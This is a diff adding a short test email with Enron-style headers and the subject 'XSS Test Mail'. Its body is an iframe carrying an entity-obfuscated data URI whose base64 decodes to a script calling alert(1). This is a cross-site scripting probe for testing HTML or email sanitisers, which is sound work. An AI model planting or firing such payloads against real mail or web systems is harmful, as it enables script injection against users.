@@ -1,0 +1,4 @@
+From: elizabeth.boudreaux@enron.com
+To: 	Taylor, Liz M.; Schoppe, Tammie; Hillis, Kimberly; Burns, Jennifer; Spiller, Tina; Schiller, Marsha; Gutierrez, Laura; Garcia, Nina
+Subject: XSS Test Mail
+<iframe src="dat&NewLine;a&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
